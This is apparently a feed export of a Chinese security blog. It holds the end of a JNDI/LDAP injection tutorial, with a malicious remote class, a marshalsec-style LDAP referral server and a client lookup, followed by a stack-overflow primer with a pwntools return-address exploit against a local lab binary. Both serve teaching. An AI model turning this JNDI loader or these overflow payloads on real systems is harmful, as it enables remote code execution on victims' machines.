<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>使用javac命令，将该类编译成class文件挂载在web页面上。</p>
<p>原理其实就是把恶意的<code>Reference</code>类，绑定在RMI的Registry 里面，在客户端调用<code>lookup</code>远程获取远程类的时候，就会获取到<code>Reference</code>对象，获取到<code>Reference</code>对象后，会去寻找<code>Reference</code>中指定的类，如果查找不到则会在<code>Reference</code>中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行。</p>
<h1 id="JNDI注入-LDAP实现攻击"><a href="#JNDI注入-LDAP实现攻击" class="headerlink" title="JNDI注入+LDAP实现攻击"></a>JNDI注入+LDAP实现攻击</h1><h2 id="LDAP概念"><a href="#LDAP概念" class="headerlink" title="LDAP概念"></a>LDAP概念</h2><p>轻型目录访问协议（英文：<code>Lightweight Directory Access Protocol</code>，缩写：<code>LDAP</code>）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p>
<p>有了前面的案例后，再来看这个其实也比较简单，之所以JNDI注入会配合LDAP是因为LDAP服务的Reference远程加载Factory类不受<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制。</p>
<p>启动一个ldap服务，该代码由某大佬改自marshalsec。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8080/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>编写一个client客户端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">clientdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/calc&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>编写一个远程恶意类，并将其编译成class文件，放置web页面中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>这里有个坑点，就是恶意的类，不能包含最上面的package信息，否则会调用失败。下面来启动一下服务器端，然后启动客户端。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>在 JDK 8u191 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被调整为false。这样的方式没法进行利用，但是还是会有绕过方式。在这里不做赘述。</p>
<p>参考文章</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//xz.aliyun.com/t/8214</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/6633</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7264</span></span><br><span class="line">https:<span class="comment">//blog.wuhao13.xin/655.html</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_33020901/article/details/98472921</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出</title>
    <url>/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研究了一段时间，做个总结。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownoabOhk5WZ26NEXg.png"></p>
<span id="more"></span>

<h1 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h1><p>栈是一种典型的后进先出 <code>(Last in First Out)</code> 的数据结构，其操作主要有<code>压栈 (push)</code> 与<code>出栈 (pop)</code> 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownP6wHiXuI2TCKBUj.png"></p>
<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
<ul>
<li><strong>x86</strong><ul>
<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
</ul>
</li>
<li><strong>x64</strong><ul>
<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
</ul>
</li>
</ul>
<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
<p>我们利用如下命令对其进行编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example gcc -m32 -fno-<span class="built_in">stack</span>-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:<span class="number">6</span>:<span class="number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+<span class="number">0x27</span>): 警告： the `gets<span class="number">&#x27;</span> function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>


<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p>
<blockquote>
<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
</blockquote>
<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example checksec stack_example</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>


<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有：</p>
<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0804843B</span> success         proc near</span><br><span class="line">.text:<span class="number">0804843B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804843</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804843</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048441</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048444</span>                 push    offset s        ; <span class="string">&quot;You Hava already controlled it.&quot;</span></span><br><span class="line">.text:<span class="number">08048449</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0804844</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048451</span>                 nop</span><br><span class="line">.text:<span class="number">08048452</span>                 leave</span><br><span class="line">.text:<span class="number">08048453</span>                 retn</span><br><span class="line">.text:<span class="number">08048453</span> success         endp</span><br></pre></td></tr></table></figure>


<p>那么如果我们读取的字符串为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure>


<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    <span class="number">0x0804843B</span>   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>


<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<p>执行一波代码，可以得到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./stack_example&#x27;</span>: pid <span class="number">61936</span></span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">61936</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>


<p>可以看到我们确实已经执行 success 函数。</p>
<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
<ul>
<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
<li>直接地址索引，就相当于直接给定了地址。</li>
</ul>
<p>一般来说，我们会有如下的覆盖需求</p>
<ul>
<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
</ul>
<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownjBQdLcvCeyPfIi8.png"></p>
<p>运行时程序的栈：<br>上面高地址处存放的是环境变量和main函数的信息<br>往下是主调函数的栈内存，包括临时变量和控制信息（控制信息包括返回地址和ebp等用来保存的寄存器的值）</p>
<p>调用约定：<br>每个函数调用的时候都会自己平衡自己的堆栈。</p>
<p>每个被调函数被调用的时候先push　ebp所以栈里面会有返回地址和ebp</p>
<h2 id="两个表"><a href="#两个表" class="headerlink" title="两个表"></a><strong>两个表</strong></h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownnbq1cslCgh27owZ.png"></p>
<ul>
<li>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址</li>
<li>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</li>
</ul>
<p>plt表：函数调用的时候先使用的。<strong>PLT表中的每一项的-数据内容都是对应的GOT表中一项的地址这个是固定不变的</strong>，<strong>PLT表中的数据是跳转到GOT表项的地址</strong>。  </p>
<p>got表：一个指向真正运行函数首地址的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>函数</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">遇到空格(<span class="number">0x20</span>)停止读取</span><br><span class="line"></span><br><span class="line">read函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span>  <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">读取数据遇到\n(<span class="number">0x0a</span>)结束，\x0a会读进去</span><br><span class="line">fd为<span class="number">0</span>从键盘读取</span><br><span class="line"></span><br><span class="line">gets函数</span><br><span class="line">gets(str);</span><br><span class="line">输入遇到\n(<span class="number">0x0a</span>)结束</span><br><span class="line">\x0a不会读进去</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>函数</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br><span class="line">输出直到\x00</span><br><span class="line"></span><br><span class="line">write函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line">fd为<span class="number">1</span>输出到显示器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>函数</span><br><span class="line"><span class="built_in">puts</span>(<span class="type">char</span> *)</span><br><span class="line">相当于<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s)</span><br><span class="line">输出字符串（遇到\x00结束）</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line">一直复制直到遇到\x00</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>函数</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br><span class="line">复制任意内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span 